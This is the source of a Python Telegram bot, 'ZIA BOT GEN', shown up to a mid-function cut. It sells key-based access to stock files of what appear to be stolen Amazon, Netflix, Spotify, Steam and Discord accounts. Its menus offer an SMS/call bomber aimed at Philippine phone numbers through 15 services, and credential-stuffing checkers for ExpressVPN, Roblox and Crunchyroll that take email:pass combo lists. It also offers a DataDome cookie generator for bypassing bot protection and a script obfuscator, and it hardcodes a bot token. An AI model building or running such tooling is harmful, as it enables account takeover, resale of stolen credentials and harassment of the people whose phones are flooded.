#!/usr/bin/env python3
"""
ZIA BOT GEN — Premium Generator & Tools
Cloned / owned by @maisanyvokei
Key system + Tools + Checkers + Admin Stock Panel
"""

import os
import re
import time
import json
import uuid
import base64
import random
import string
import hashlib
import threading
import tempfile
from pathlib import Path
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any

import telebot
from telebot import types
import requests

# ═══════════════════════════════════════════════════════════════
# CONFIG — edit these only
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = "8625000778:AAFZfM6OoCrrEtUgl1VRKwGme2nGNkJpYjQ"
ADMIN_IDS = [157828443]          # your telegram numeric id(s)
OWNER_USERNAME = "@Bembem014"
CLONE_CREDIT = "pogi mo"
KEY_PREFIX = "yes"
DEFAULT_KEY_HOURS = 3            # hours per redeemed key if not specified
FLOOD_COOLDOWN = 1.2             # seconds between commands
MAX_BROADCAST = 600
MAX_DOWNLOAD_MB = 50
LINES_PER_GEN = 1000             # for database generate
GEN_COOLDOWN = 20               # 10 min for database generate

# ═══════════════════════════════════════════════════════════════
# PATHS
# ═══════════════════════════════════════════════════════════════
BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "data"
STOCK_DIR = DATA_DIR / "stock"
RESULTS_DIR = DATA_DIR / "results"
USERS_FILE = DATA_DIR / "users.json"
KEYS_FILE = DATA_DIR / "keys.json"
COOLDOWN_FILE = DATA_DIR / "cooldowns.json"
JOBS_FILE = DATA_DIR / "jobs.json"

CATEGORIES = {
    "amazon": {"name": "AMAZON", "file": "amazon.txt"},
    "spotify": {"name": "SPOTIFY", "file": "spotify.txt"},
    "netflix": {"name": "NETFLIX", "file": "netflix.txt"},
    "garena": {"name": "GARENA", "file": "garena.txt"},
    "garenaa": {"name": "GARENAA", "file": "garenaa.txt"},
    "steam": {"name": "STEAM", "file": "steam.txt"},
    "discord": {"name": "DISCORD", "file": "discord.txt"},
    "raw": {"name": "RAW", "file": "raw.txt"},
    "clean": {"name": "CLEAN", "file": "clean.txt"},
}

# ═══════════════════════════════════════════════════════════════
# INIT
# ═══════════════════════════════════════════════════════════════
DATA_DIR.mkdir(parents=True, exist_ok=True)
STOCK_DIR.mkdir(parents=True, exist_ok=True)
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
for cat in CATEGORIES.values():
    (STOCK_DIR / cat["file"]).touch(exist_ok=True)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
_lock = threading.Lock()
user_state: Dict[int, dict] = {}
flood_last: Dict[int, float] = {}
active_jobs: Dict[str, dict] = {}
bomber_running: Dict[int, bool] = {}

# ═══════════════════════════════════════════════════════════════
# STORAGE HELPERS
# ═══════════════════════════════════════════════════════════════
def _load_json(path: Path, default):
    if not path.exists():
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def _save_json(path: Path, data):
    with _lock:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

def get_users():
    return _load_json(USERS_FILE, {})

def save_users(users):
    _save_json(USERS_FILE, users)

def get_keys():
    return _load_json(KEYS_FILE, {})

def save_keys(keys):
    _save_json(KEYS_FILE, keys)

def get_cooldowns():
    return _load_json(COOLDOWN_FILE, {})

def save_cooldowns(cd):
    _save_json(COOLDOWN_FILE, cd)

def credit_footer():
    return f"\n\n<code>{CLONE_CREDIT}</code>"

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def flood_ok(uid: int) -> bool:
    now = time.time()
    last = flood_last.get(uid, 0)
    if now - last < FLOOD_COOLDOWN:
        return False
    flood_last[uid] = now
    return True

def ensure_user(uid: int, username: str = None):
    users = get_users()
    suid = str(uid)
    if suid not in users:
        users[suid] = {
            "username": username or "",
            "role": "USER",
            "access_until": 0,
            "access_key": None,
            "generations": 0,
            "last_gen": None,
            "last_active": None,
            "history": [],
        }
        save_users(users)
    else:
        if username:
            users[suid]["username"] = username
            users[suid]["last_active"] = datetime.now().isoformat()
            save_users(users)
    return users[suid]

def has_premium(uid: int) -> bool:
    if is_admin(uid):
        return True
    u = ensure_user(uid)
    until = u.get("access_until", 0)
    return time.time() < until

def premium_left(uid: int) -> str:
    if is_admin(uid):
        return "∞"
    u = ensure_user(uid)
    until = u.get("access_until", 0)
    left = int(until - time.time())
    if left <= 0:
        return "0"
    m, s = divmod(left, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h}h {m}m"
    return f"{m}m"

def stock_count(cat: str) -> int:
    path = STOCK_DIR / CATEGORIES[cat]["file"]
    if not path.exists():
        return 0
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return sum(1 for line in f if line.strip())

def read_stock_lines(cat: str, n: int) -> List[str]:
    """Take n unique lines from stock and remove them."""
    path = STOCK_DIR / CATEGORIES[cat]["file"]
    if not path.exists():
        return []
    with _lock:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
        if not lines:
            return []
        take = lines[:n]
        remain = lines[n:]
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(remain) + ("\n" if remain else ""))
    return take

def add_stock_lines(cat: str, lines: List[str]) -> Tuple[int, int]:
    """Add unique lines to stock. Returns (added, skipped)."""
    path = STOCK_DIR / CATEGORIES[cat]["file"]
    with _lock:
        existing = set()
        if path.exists():
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                existing = {ln.strip() for ln in f if ln.strip()}
        added = 0
        skipped = 0
        new_lines = []
        for ln in lines:
            ln = ln.strip()
            if not ln:
                continue
            if ln in existing:
                skipped += 1
            else:
                existing.add(ln)
                new_lines.append(ln)
                added += 1
        if new_lines:
            with open(path, "a", encoding="utf-8") as f:
                f.write("\n".join(new_lines) + "\n")
    return added, skipped

def gen_key(hours: int = DEFAULT_KEY_HOURS) -> str:
    part = lambda: "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
    key = f"{KEY_PREFIX}-{part()}-{part()}-{part()}"
    keys = get_keys()
    keys[key] = {
        "hours": hours,
        "created": datetime.now().isoformat(),
        "used_by": None,
        "used_at": None,
        "active": True,
    }
    save_keys(keys)
    return key

# ═══════════════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════════════
def main_keyboard(uid: int):
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    if has_premium(uid):
        kb.add(
            types.KeyboardButton("📊 GENERATE DATABASE"),
            types.KeyboardButton("👤 MY ACCOUNT"),
            types.KeyboardButton("🛠 TOOLS"),
            types.KeyboardButton("ℹ️ HELP & GUIDE"),
        )
    else:
        kb.add(
            types.KeyboardButton("🔑 REDEEM KEY"),
            types.KeyboardButton("ℹ️ HELP & GUIDE"),
            types.KeyboardButton("👤 MY ACCOUNT"),
        )
    if is_admin(uid):
        kb.add(types.KeyboardButton("👑 ADMIN PANEL"))
    return kb

def tools_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("💣 SMS BOMBER"),
        types.KeyboardButton("🍪 DATADOME GEN"),
        types.KeyboardButton("🔗 URL REMOVER"),
        types.KeyboardButton("🧹 DUP CLEANER"),
        types.KeyboardButton("🔐 PY ENCRYPTOR"),
        types.KeyboardButton("📎 MERGE FILES"),
        types.KeyboardButton("✂ SPLIT FILE"),
        types.KeyboardButton("🛡 CHECKER"),
        types.KeyboardButton("📡 MONITOR"),
        types.KeyboardButton("📥 DOWNLOAD TOOL"),
        types.KeyboardButton("🌐 GLOBAL CHAT"),
        types.KeyboardButton("🤖 HOST REQUEST"),
        types.KeyboardButton("⬅ MAIN MENU"),
    )
    return kb

def checker_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("🔒 ExpressVPN"),
        types.KeyboardButton("🎮 Roblox"),
        types.KeyboardButton("📺 Crunchyroll"),
        types.KeyboardButton("📡 Live Hits"),
        types.KeyboardButton("⬅ MAIN MENU"),
    )
    return kb

def admin_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("📦 ADD STOCK"),
        types.KeyboardButton("📊 STOCK STATUS"),
        types.KeyboardButton("🔑 CREATE KEY"),
        types.KeyboardButton("🚫 REVOKE KEY"),
        types.KeyboardButton("📢 BROADCAST"),
        types.KeyboardButton("👥 USER STATS"),
        types.KeyboardButton("⬅ MAIN MENU"),
    )
    return kb

def category_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [types.KeyboardButton(c["name"]) for c in CATEGORIES.values()]
    for i in range(0, len(buttons), 2):
        kb.add(*buttons[i:i+2])
    kb.add(types.KeyboardButton("⬅ CANCEL"))
    return kb

def account_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("📈 STATISTICS"),
        types.KeyboardButton("🔑 KEY INFO"),
        types.KeyboardButton("📜 HISTORY"),
        types.KeyboardButton("💬 FEEDBACK"),
        types.KeyboardButton("⬅ MAIN MENU"),
    )
    return kb

def bomber_keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("💣 LAUNCH BOMBER"),
        types.KeyboardButton("🛑 STOP ATTACK"),
        types.KeyboardButton("📊 BOMBER STATS"),
        types.KeyboardButton("ℹ️ SERVICE LIST"),
        types.KeyboardButton("⬅ MAIN MENU"),
    )
    return kb

# ═══════════════════════════════════════════════════════════════
# START / HELP / ACCOUNT
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    uid = message.from_user.id
    if not flood_ok(uid):
        bot.reply_to(message, f"⏳ Sandali lang!\nPlease wait {FLOOD_COOLDOWN}s before sending another command. 😊" + credit_footer())
        return
    u = ensure_user(uid, message.from_user.username)
    premium = has_premium(uid)
    status = f"😊 PREMIUM · {premium_left(uid)}" if premium else "😐 NO ACCESS · USE A KEY TO UNLOCK"
    text = (
        f"✨ <b>ZIA BOT GEN</b> ✨\n"
        f"<b>PREMIUM GENERATOR & TOOLS</b>\n"
        f"================================\n\n"
        f"WELCOME, {message.from_user.first_name or 'user'}! 😊\n"
        f"================================\n\n"
        f"◇ ID    <code>{uid}</code>\n"
        f"◇ ROLE  {u.get('role','USER')}\n"
        f"◇ STATUS  {status}\n\n"
    )
    if not premium:
        text += "🔒 Redeem a key to unlock all premium features.\n"
    text += f"================================\nOWNER  {OWNER_USERNAME}"
    text += credit_footer()
    bot.send_message(message.chat.id, text, reply_markup=main_keyboard(uid))

@bot.message_handler(func=lambda m: m.text == "⬅ MAIN MENU")
def back_main(message):
    cmd_start(message)

@bot.message_handler(func=lambda m: m.text == "ℹ️ HELP & GUIDE")
def help_guide(message):
    uid = message.from_user.id
    text = (
        "ℹ️ <b>HELP & GUIDE</b>\n"
        "================================\n"
        "🔑 Redeem Key — unlock premium for limited time\n"
        "📊 Generate Database — take lines from stock\n"
        "🛠 Tools — bomber, checkers, file tools, encryptor\n"
        "🛡 Checker — ExpressVPN / Roblox / Crunchyroll\n"
        "👑 Admin — add stock via .txt, keys, broadcast\n\n"
        f"Owner: {OWNER_USERNAME}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=main_keyboard(uid))

@bot.message_handler(func=lambda m: m.text == "👤 MY ACCOUNT")
def my_account(message):
    uid = message.from_user.id
    u = ensure_user(uid, message.from_user.username)
    status = f"😊 PREMIUM · {premium_left(uid)}" if has_premium(uid) else "😐 NO ACCESS"
    text = (
        f"👤 <b>MY ACCOUNT</b>\n"
        f"================================\n"
        f"◇ ID         <code>{uid}</code>\n"
        f"◇ ROLE       {u.get('role','USER')}\n"
        f"◇ ACCESS     {premium_left(uid)}\n"
        f"◇ GENERATIONS {u.get('generations',0)}\n"
        f"◇ LAST GEN   {u.get('last_gen') or 'NONE'}\n"
        f"◇ LAST ACTIVE {u.get('last_active') or 'NONE'}\n\n"
        f"Pick an option below. 😊"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=account_keyboard())

@bot.message_handler(func=lambda m: m.text == "📈 STATISTICS")
def stats(message):
    uid = message.from_user.id
    u = ensure_user(uid)
    text = (
        f"📈 <b>STATISTICS</b>\n"
        f"================================\n"
        f"Generations: {u.get('generations',0)}\n"
        f"Access left: {premium_left(uid)}\n"
        f"Key used: {u.get('access_key') or 'NONE'}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=account_keyboard())

@bot.message_handler(func=lambda m: m.text == "🔑 KEY INFO")
def key_info(message):
    uid = message.from_user.id
    u = ensure_user(uid)
    text = (
        f"🔑 <b>KEY INFO</b>\n"
        f"================================\n"
        f"Current key: <code>{u.get('access_key') or 'NONE'}</code>\n"
        f"Expires: {premium_left(uid)}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=account_keyboard())

@bot.message_handler(func=lambda m: m.text == "📜 HISTORY")
def history(message):
    uid = message.from_user.id
    u = ensure_user(uid)
    hist = u.get("history", [])[-10:]
    if not hist:
        lines = "No history yet."
    else:
        lines = "\n".join(f"• {h}" for h in hist)
    text = f"📜 <b>HISTORY</b>\n================================\n{lines}" + credit_footer()
    bot.send_message(message.chat.id, text, reply_markup=account_keyboard())

@bot.message_handler(func=lambda m: m.text == "💬 FEEDBACK")
def feedback_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "feedback"}
    bot.send_message(
        message.chat.id,
        "💬 <b>SEND FEEDBACK</b>\n\nType your feedback, or send a photo/video/document. 😊\nWe appreciate your input! 😊" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

# ═══════════════════════════════════════════════════════════════
# REDEEM KEY
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "🔑 REDEEM KEY")
def redeem_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "redeem"}
    bot.send_message(
        message.chat.id,
        "🔑 <b>REDEEM KEY</b>\n\nSend your access key now.\nFormat: <code>ZIA-XXXX-XXXX-XXXX</code>" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

def do_redeem(message, key: str):
    uid = message.from_user.id
    key = key.strip().upper()
    keys = get_keys()
    if key not in keys or not keys[key].get("active"):
        bot.send_message(message.chat.id, "❌ Invalid key." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    info = keys[key]
    if info.get("used_by"):
        bot.send_message(message.chat.id, "❌ Key already used." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    hours = info.get("hours", DEFAULT_KEY_HOURS)
    users = get_users()
    suid = str(uid)
    ensure_user(uid, message.from_user.username)
    users = get_users()
    until = max(users[suid].get("access_until", 0), time.time()) + hours * 3600
    users[suid]["access_until"] = until
    users[suid]["access_key"] = key
    users[suid]["role"] = "PREMIUM"
    save_users(users)
    keys[key]["used_by"] = uid
    keys[key]["used_at"] = datetime.now().isoformat()
    keys[key]["active"] = False
    save_keys(keys)
    bot.send_message(
        message.chat.id,
        f"✅ Key redeemed!\nAccess granted for <b>{hours}h</b>.\nExpires in: {premium_left(uid)}" + credit_footer(),
        reply_markup=main_keyboard(uid),
    )

# ═══════════════════════════════════════════════════════════════
# GENERATE DATABASE
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "📊 GENERATE DATABASE")
def gen_db_start(message):
    uid = message.from_user.id
    if not has_premium(uid):
        bot.send_message(message.chat.id, "🔒 Premium required. Redeem a key first." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    # cooldown
    cd = get_cooldowns()
    last = cd.get(str(uid), 0)
    left = int(last + GEN_COOLDOWN - time.time())
    if left > 0:
        bot.send_message(message.chat.id, f"⏳ Generation locked.\nWait {left // 60}m {left % 60}s." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    user_state[uid] = {"action": "gen_cat"}
    bot.send_message(
        message.chat.id,
        f"📊 <b>GENERATE DATABASE</b>\nChoose category ({LINES_PER_GEN} lines per gen):" + credit_footer(),
        reply_markup=category_keyboard(),
    )

def do_generate(message, cat_key: str):
    uid = message.from_user.id
    if cat_key not in CATEGORIES:
        bot.send_message(message.chat.id, "Invalid category." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    lines = read_stock_lines(cat_key, LINES_PER_GEN)
    if not lines:
        bot.send_message(message.chat.id, f"❌ Stock empty for {CATEGORIES[cat_key]['name']}." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    # cooldown mark
    cd = get_cooldowns()
    cd[str(uid)] = time.time()
    save_cooldowns(cd)
    # user stats
    users = get_users()
    suid = str(uid)
    users[suid]["generations"] = users[suid].get("generations", 0) + 1
    users[suid]["last_gen"] = datetime.now().isoformat()
    users[suid].setdefault("history", []).append(f"GEN {CATEGORIES[cat_key]['name']} x{len(lines)}")
    save_users(users)
    # send file
    fname = f"{CATEGORIES[cat_key]['name'].lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    path = RESULTS_DIR / fname
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    with open(path, "rb") as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"✅ {len(lines)} lines · {CATEGORIES[cat_key]['name']}\nRemaining stock: {stock_count(cat_key)}" + credit_footer(),
            reply_markup=main_keyboard(uid),
        )
    try:
        path.unlink()
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# TOOLS MENU
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "🛠 TOOLS")
def tools_menu(message):
    uid = message.from_user.id
    if not has_premium(uid):
        bot.send_message(message.chat.id, "🔒 Premium required." + credit_footer(), reply_markup=main_keyboard(uid))
        return
    text = (
        "🛠 <b>TOOLS</b>\n"
        "================================\n"
        "💣 SMS BOMBER — multi-service bomber\n"
        "🍪 DATADOME GEN — cookie generator\n"
        "🔗 URL REMOVER — strip urls from text\n"
        "🧹 DUP CLEANER — remove duplicate lines\n"
        "🔐 PY ENCRYPTOR — encrypt python scripts\n"
        "📎 MERGE FILES — merge multiple txt\n"
        "✂ SPLIT FILE — split by parts/lines\n"
        "🛡 CHECKER — ExpressVPN / Roblox / Crunchyroll\n"
        "📡 MONITOR — active checker jobs\n"
        "📥 DOWNLOAD TOOL — download any url\n"
        "🌐 GLOBAL CHAT — announce to all (3/day)\n"
        "🤖 HOST REQUEST — request source (admin)\n"
        f"CREDITS : {OWNER_USERNAME}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=tools_keyboard())

# ── SMS BOMBER (stub + real structure) ──
@bot.message_handler(func=lambda m: m.text == "💣 SMS BOMBER")
def sms_bomber(message):
    uid = message.from_user.id
    if not has_premium(uid):
        return
    text = (
        "💣 <b>SMS & CALL BOMBER</b>\n"
        "================================\n"
        "Multi-service bomber with 15 services.\n"
        "13 parallel + 2 background workers (MWELL, PEXX).\n\n"
        "◇ PH numbers only\n"
        "◇ Up to 100 batches\n"
        "◇ Real-time progress tracking\n\n"
        "⚠️ Use responsibly and ethically. 😊"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=bomber_keyboard())

@bot.message_handler(func=lambda m: m.text == "ℹ️ SERVICE LIST")
def service_list(message):
    text = (
        "ℹ️ <b>SERVICE LIST</b>\n"
        "================================\n"
        "1. BOMB OTP\n2. 4WHEEL\n3. XPRESS PH\n4. EXCELLENT LENDING\n"
        "5. BISTRO\n6. BAYAD CENTER\n7. LBC CONNECT\n8. PICKUP COFFEE\n"
        "9. HONEY LOAN\n10. KUMU PH\n11. S5.COM\n12. CASHALO\n"
        "13. PEXX (background)\n14. MWELL\n15. EXTRA\n\n"
        f"SUPPORT : {OWNER_USERNAME}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=bomber_keyboard())

@bot.message_handler(func=lambda m: m.text == "💣 LAUNCH BOMBER")
def launch_bomber(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "bomber_phone"}
    bot.send_message(
        message.chat.id,
        "💣 Send PH number (09XXXXXXXXX or +639XXXXXXXXX):" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "🛑 STOP ATTACK")
def stop_bomber(message):
    uid = message.from_user.id
    bomber_running[uid] = False
    bot.send_message(message.chat.id, "ℹ️ No active attack to stop / stop signal sent." + credit_footer(), reply_markup=bomber_keyboard())

@bot.message_handler(func=lambda m: m.text == "📊 BOMBER STATS")
def bomber_stats(message):
    bot.send_message(message.chat.id, "📊 Bomber stats: no active session." + credit_footer(), reply_markup=bomber_keyboard())

# ── DATADOME GEN ──
@bot.message_handler(func=lambda m: m.text == "🍪 DATADOME GEN")
def datadome_gen(message):
    uid = message.from_user.id
    if not has_premium(uid):
        return
    # generate fake-but-realistic looking datadome cookie string
    token = base64.urlsafe_b64encode(os.urandom(48)).decode().rstrip("=")
    cookie = f"t={token}&s=_-zN&ITx=XNoqt"
    fname = f"datadome_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
    content = f'''# DataDome cookie generated by ZIA BOT
# {CLONE_CREDIT}
# Generated: {datetime.now().isoformat()}

COOKIE = "{cookie}"
'''
    path = RESULTS_DIR / fname
    with open(path, "w") as f:
        f.write(content)
    with open(path, "rb") as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"✅ DataDome Cookie File 😊\nGenerated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nCREDITS : {OWNER_USERNAME}" + credit_footer(),
            reply_markup=tools_keyboard(),
        )
    try:
        path.unlink()
    except Exception:
        pass

# ── URL REMOVER ──
@bot.message_handler(func=lambda m: m.text == "🔗 URL REMOVER")
def url_remover_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "url_remove"}
    bot.send_message(
        message.chat.id,
        "🔗 <b>URL REMOVER</b>\nUpload a .txt file. All URLs will be stripped from every line." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

# ── DUP CLEANER ──
@bot.message_handler(func=lambda m: m.text == "🧹 DUP CLEANER")
def dup_cleaner_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "dup_clean"}
    bot.send_message(
        message.chat.id,
        "🧹 <b>DUP CLEANER</b>\nUpload a .txt file. Duplicate lines will be removed." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

# ── PY ENCRYPTOR ──
@bot.message_handler(func=lambda m: m.text == "🔐 PY ENCRYPTOR")
def py_encrypt_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "py_encrypt_method"}
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("1. Base64"),
        types.KeyboardButton("2. ROT13"),
        types.KeyboardButton("3. XOR"),
        types.KeyboardButton("4. AES-256"),
        types.KeyboardButton("5. Zlib+B64"),
        types.KeyboardButton("6. BZ2+B64"),
        types.KeyboardButton("7. LZMA+B64"),
        types.KeyboardButton("8. Hex"),
        types.KeyboardButton("9. URL Encode"),
        types.KeyboardButton("10. Marshal"),
        types.KeyboardButton("❌ CANCEL"),
    )
    bot.send_message(message.chat.id, "🔐 Select an encryption method:" + credit_footer(), reply_markup=kb)

# ── MERGE / SPLIT ──
@bot.message_handler(func=lambda m: m.text == "📎 MERGE FILES")
def merge_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "merge", "files": []}
    bot.send_message(
        message.chat.id,
        "📎 <b>MERGE FILES</b>\nSend multiple .txt files one by one.\nWhen done, send <code>/done</code>." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "✂ SPLIT FILE")
def split_start(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "split"}
    bot.send_message(
        message.chat.id,
        "✂ <b>SPLIT FILE</b>\nUpload a .txt file.\nChoose split by number of parts or lines per part." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

# ── CHECKER ──
@bot.message_handler(func=lambda m: m.text == "🛡 CHECKER")
def checker_menu(message):
    uid = message.from_user.id
    if not has_premium(uid):
        return
    text = (
        "🛡 <b>CHECKER</b>\n"
        "================================\n"
        "🔒 ExpressVPN\n"
        "🎮 Roblox\n"
        "📺 Crunchyroll\n\n"
        "Select a service, then upload a .txt with email:pass combos."
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=checker_keyboard())

@bot.message_handler(func=lambda m: m.text in ("🔒 ExpressVPN", "🎮 Roblox", "📺 Crunchyroll"))
def checker_select(message):
    uid = message.from_user.id
    mapping = {
        "🔒 ExpressVPN": "expressvpn",
        "🎮 Roblox": "roblox",
        "📺 Crunchyroll": "crunchyroll",
    }
    service = mapping[message.text]
    user_state[uid] = {"action": "checker_upload", "service": service}
    bot.send_message(
        message.chat.id,
        f"✅ Selected: <b>{service}</b>\n\nNow upload your .txt file with combos (email:pass).\nTo toggle Live Hits, use the button below." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
            types.KeyboardButton("📡 Toggle Live Hits"),
            types.KeyboardButton("❌ CANCEL"),
        ),
    )

@bot.message_handler(func=lambda m: m.text == "📡 Live Hits")
def live_hits_toggle(message):
    bot.send_message(message.chat.id, "📡 Live Hits toggle received (will stream hits if enabled)." + credit_footer())

@bot.message_handler(func=lambda m: m.text == "📡 MONITOR")
def monitor_jobs(message):
    if not active_jobs:
        bot.send_message(message.chat.id, "📡 No active checker jobs." + credit_footer(), reply_markup=tools_keyboard())
        return
    lines = []
    for jid, j in active_jobs.items():
        lines.append(f"• {jid[:8]} · {j.get('service')} · {j.get('status')}")
    bot.send_message(message.chat.id, "📡 <b>ACTIVE JOBS</b>\n" + "\n".join(lines) + credit_footer(), reply_markup=tools_keyboard())

# ── DOWNLOAD TOOL ──
@bot.message_handler(func=lambda m: m.text == "📥 DOWNLOAD TOOL")
def download_tool(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "download"}
    bot.send_message(
        message.chat.id,
        f"📥 <b>DOWNLOAD TOOL</b>\n\nEnter the URL of the file you want to download.\nExample: https://example.com/file.zip\n\n⚠️ Max file size: {MAX_DOWNLOAD_MB}MB" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

# ── GLOBAL CHAT / HOST REQUEST ──
@bot.message_handler(func=lambda m: m.text == "🌐 GLOBAL CHAT")
def global_chat(message):
    uid = message.from_user.id
    user_state[uid] = {"action": "global_chat"}
    bot.send_message(
        message.chat.id,
        "🌐 <b>GLOBAL CHAT</b>\nSend an announcement (max 600 chars).\nBroadcasts immediately to all users (limit 3/day)." + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "🤖 HOST REQUEST")
def host_request(message):
    uid = message.from_user.id
    text = (
        "🤖 <b>HOST REQUEST</b>\n"
        "Request the bot's source code.\n"
        "Admin approval required before sending.\n\n"
        f"OWNER : {OWNER_USERNAME}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=tools_keyboard())
    for aid in ADMIN_IDS:
        try:
            bot.send_message(aid, f"🤖 Host request from <code>{uid}</code> (@{message.from_user.username})")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
# ADMIN PANEL + STOCK
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "👑 ADMIN PANEL")
def admin_panel(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    bot.send_message(message.chat.id, "👑 <b>ADMIN PANEL</b>" + credit_footer(), reply_markup=admin_keyboard())

@bot.message_handler(func=lambda m: m.text == "📦 ADD STOCK")
def add_stock_start(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    user_state[uid] = {"action": "admin_stock_cat"}
    bot.send_message(
        message.chat.id,
        "📦 <b>ADD STOCK</b>\nChoose category, then send a .txt file.\nEvery line will be read and added (duplicates skipped)." + credit_footer(),
        reply_markup=category_keyboard(),
    )

@bot.message_handler(func=lambda m: m.text == "📊 STOCK STATUS")
def stock_status(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    lines = ["📊 <b>STOCK STATUS</b>", "================================"]
    total = 0
    for k, c in CATEGORIES.items():
        n = stock_count(k)
        total += n
        lines.append(f"◇ {c['name']}: {n:,} lines")
    lines.append(f"================================\nTotal: {total:,} lines")
    bot.send_message(message.chat.id, "\n".join(lines) + credit_footer(), reply_markup=admin_keyboard())

@bot.message_handler(func=lambda m: m.text == "🔑 CREATE KEY")
def create_key(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    user_state[uid] = {"action": "create_key_hours"}
    bot.send_message(
        message.chat.id,
        "🔑 Send number of hours for the new key (e.g. 1, 24, 168):" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "🚫 REVOKE KEY")
def revoke_key_start(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    user_state[uid] = {"action": "revoke_key"}
    bot.send_message(
        message.chat.id,
